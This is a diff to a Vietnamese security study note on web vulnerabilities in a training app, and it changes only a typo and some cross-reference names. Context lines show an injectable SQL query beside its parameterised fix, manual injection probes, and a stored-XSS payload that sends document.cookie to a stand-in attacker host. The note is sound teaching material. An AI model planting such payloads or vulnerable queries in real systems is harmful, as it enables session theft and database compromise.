@@ -44,7 +44,7 @@ tính năng. Đây là vuln "kinh điển" nhất, luôn đứng đầu danh sá
 là lệnh:
 
 ```javascript
-// SAi (vulnerable)
+// SAI (vulnerable)
 const r = await pool.query(`SELECT * FROM users WHERE email='${email}' AND password='${password}'`)
 // ĐÚNG (fixed)
 const r = await pool.query('SELECT * FROM users WHERE email=$1 AND password=$2', [email, password])
@@ -59,7 +59,7 @@ tay bằng Postman (tasks/09). Dấu hiệu tay: input `'` gây 500, `' ORDER BY
 
 **Cơ chế:** input chứa HTML/JS được **lưu vào DB** rồi **render lại dưới dạng HTML** cho
 người khác. Browser tưởng đó là code của trang (cùng origin) → chạy với toàn quyền.
-(Xem chi tiết `same-origin-csrf-xss.md`.)
+(Xem chi tiết `session-cookie-csrf-xss.md`.)
 
 ```
 Review content lưu:  <img src=x onerror="fetch('http://attacker/c?'+document.cookie)">
@@ -89,7 +89,7 @@ Nếu request thay đổi trạng thái (đổi email…) mà chỉ dựa cookie
 trang attacker chỉ cần 1 form ẩn tự submit là "mượn tay" nạn nhân thực hiện hành động.
 
 ```
-(chi tiết cơ chế + điều kiện 4 cái: same-origin-csrf-xss.md §3)
+(chi tiết cơ chế + điều kiện 4 cái: session-cookie-csrf-xss.md §6)
 FashionHub: POST /api/profile/email  {newEmail}  — chỉ cần cookie, không token, cookie None
 ```
 
